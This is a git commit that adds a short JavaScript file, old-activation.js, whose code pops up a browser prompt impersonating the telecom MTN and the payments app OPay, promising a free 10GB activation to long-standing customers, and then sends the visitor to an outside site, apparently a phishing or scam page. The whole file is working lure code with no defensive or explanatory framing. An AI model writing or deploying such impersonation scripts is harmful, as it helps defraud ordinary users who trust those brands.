39bc49ef5e74a0925ecd2ac34fec1e6ce446d2b8
trafficbank <153836234+trafficbank@users.noreply.github.com>
2024-10-19 23:14:39 -0700

    Create old-activation.js

---
+++ old-activation.js
@@ -0,0 +1,6 @@
+
+var password = 'Activate 10GB'
+password=prompt('MTN: Dear OPay customer, If your account is up to 6 months or above, press OK to Activate 10GB NOW ','Activate 10GB');
+if (password != 'Activate 10GB') {
+location.href='https://get-offre.org/old-customers.html';
+}
